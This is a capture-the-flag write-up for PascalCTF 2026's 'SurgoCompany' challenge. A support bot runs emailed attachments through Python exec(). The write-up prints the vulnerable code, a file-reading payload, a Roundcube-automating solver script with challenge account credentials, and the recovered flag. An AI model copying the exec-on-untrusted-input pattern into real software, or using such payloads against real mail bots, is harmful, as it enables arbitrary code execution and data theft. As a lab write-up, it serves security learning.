@@ -1,0 +1,141 @@
+---
+title: 'PascalCTF 2026 - SurgoCompany'
+description: 'Writeup for SurgoCompany from PascalCTF 2026. A Misc challenge involving Python RCE via email attachment and Roundcube automation.'
+date: 2026-02-01
+tags: ['writeup', 'misc', 'rce', 'python', 'email', 'roundcube', 'pascalctf']
+authors: ['kudaliar']
+draft: false
+---
+
+## Challenge Overview
+**Name**: SurgoCompany
+**Category**: Misc
+**Objective**: Exploit a vulnerability in the customer service bot to read the `flag.txt` file.
+
+## Vulnerability Analysis
+
+The challenge provided the source code for the customer service bot. The critical function is `check_attachment`, which is called when the bot receives a reply from a user with a matching Ticket PID.
+
+```python
+def check_attachment(filepath):
+    if filepath is None:
+        return False
+
+    print(f"Checking attachment '{filepath}'...")
+
+    # Read the attachment content
+    try:
+        with open(filepath, "r") as f:
+            content = f.read()
+    except Exception as e:
+        # ... error handling ...
+        return
+
+    # Execute the attachment's code
+    try:
+        # VULNERABILITY: Arbitrary Code Execution
+        exec(content)
+        print("The attachment did not pass the security check.")
+        print("Removing the attachment...")
+
+    except Exception as e:
+        print("The attachment passed the security check.")
+        # ...
+```
+
+The bot takes the content of the email attachment and directly passes it to Python's `exec()` function. This is a classic **Remote Code Execution (RCE)** vulnerability. If we can upload a Python script as an attachment, the bot will execute it.
+
+## Exploitation Strategy
+
+### The Plan
+1.  **Initiate Session**: Connect to the challenge server (`surgobot.ctf.pascalctf.it:6005`) to generate a ticket. The server sends an email to the provided address with a Ticket PID.
+2.  **Receive Email**: Access the email account to find the message from the bot and extract the PID.
+3.  **Send Exploit**: Reply to the bot (or send a new email) with the correct subject format (`Surgo Company Customer Support - Request no. <PID>`) and attach a Python script that reads `flag.txt`.
+4.  **Capture Output**: The bot's output (stdout of `exec`) is piped back to the challenge connection, allowing us to see the flag.
+
+### Obstacles
+Initially, I attempted to use standard IMAP/SMTP libraries (`imaplib`, `smtplib`) to handle the emails. However, connection attempts to standard mail ports (993, 465, 587, 25) on `surgo.ctf.pascalctf.it` timed out. It appeared that direct access to the mail server ports was blocked from the outside.
+
+### Solution: Webmail Automation
+The challenge provided a webmail interface at `https://surgo.ctf.pascalctf.it`, running **Roundcube**. Since the HTTP/HTTPS ports were accessible, I pivoted to automating the webmail interface to send the exploit.
+
+I developed a Python script (`solve_roundcube.py`) that acts as a custom Roundcube client:
+1.  **Authentication**: Logs into Roundcube using `requests` by parsing CSRF tokens (`_token`).
+2.  **Inbox Polling**: Uses Roundcube's AJAX API (`_action=list`) to retrieve email headers in JSON format. This was necessary because the standard HTML view didn't reliably show new messages immediately due to caching/loading behaviors.
+3.  **Dynamic Parsing**: Extracts the Ticket PID and the bot's sender address directly from the email headers.
+4.  **Sending the Exploit**: 
+    -   Uses the Roundcube `compose` and `upload` actions to attach the payload.
+    -   Sends the email using the `send` action, ensuring the correct `_from` identity and `_remote=1` parameters were set to emulate a real browser request.
+    -   **Important**: We sent a *fresh* email instead of using the "Reply" function to ensure a clean subject line and avoid potential threading issues that caused the bot to miss previous attempts.
+
+### The Payload (`exploit.py`)
+```python
+import os
+print("FLAG_START")
+try:
+    print(open("flag.txt").read())
+except Exception as e: 
+    print(f"Err: {e}")
+    # Fallback: list directory if flag filename is different
+    print("DIR_LIST:")
+    print(os.listdir("."))
+print("FLAG_END")
+```
+
+## Solver Script
+
+The final solver script automates the entire interaction:
+
+```python
+import requests
+from bs4 import BeautifulSoup
+from pwn import *
+import time
+import re
+
+URL = 'https://surgo.ctf.pascalctf.it'
+USER = 'user-rct36k68@skillissue.it'
+PASS = 'NroMwieCU8zFmuSc'
+HOST = 'surgobot.ctf.pascalctf.it'
+PORT = 6005
+
+s = requests.Session()
+
+# ... (Helper functions for login, token extraction, and Roundcube actions) ...
+
+def main():
+    if not login(): return
+
+    print("[*] Connecting to challenge...")
+    p = remote(HOST, PORT)
+    p.recvuntil(b'Enter your email address:')
+    p.sendline(USER.encode())
+    
+    # ... (Polling loop to find email and extract PID/Sender) ...
+    
+    if target_pid:
+        sender = found_sender if found_sender else 'surgobot@skillissue.it'
+        send_fresh_email(target_pid, sender)
+    
+    # Capture flag
+    try:
+        while True:
+            line = p.recvline(timeout=2)
+            if b'FLAG_START' in line:
+                flag = p.recvline().decode().strip()
+                print(f"\n[!!!] FLAG: {flag}\n")
+                break
+    except KeyboardInterrupt: pass
+    p.close()
+
+if __name__ == '__main__':
+    main()
+```
+
+## Results
+
+Running the solver successfully retrieved the flag:
+
+```text
+[!!!] FLAG: pascalCTF{ch3_5urG4t4_d1_ch4ll3ng3}
+```
